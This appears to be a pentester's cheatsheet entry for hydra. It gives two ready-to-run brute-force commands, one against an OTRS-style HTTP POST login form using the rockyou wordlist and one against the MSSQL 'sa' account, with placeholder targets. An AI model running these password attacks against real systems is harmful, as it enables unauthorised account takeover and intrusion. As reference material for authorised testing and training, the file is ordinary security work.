---
id: 3c41670d-031a-46e4-89ae-21745842b280
name: hydra
type: cheatsheet
verified: false
created_at: '2020-07-14T18:23:00.931682+00:00'
updated_at: '2023-05-29T16:48:52.690130+00:00'
---

# hydra

**Command** ([[bruteforce http_post with example post-data]]):

```bash
hydra -l root@localhost -P /usr/share/wordlists/rockyou.txt target-ip http-post-form "/otrs/index.pl:Action=Login&RequestedURL=&Lang=en&TimeOffset=-60&User=^USER^&Password=^PASS^: Login failed!"

```

**Command** ([[bruteforce mssql]]):

```bash
hydra -l sa -P ../creds/pass.txt target-ip -s target-port mssql

```
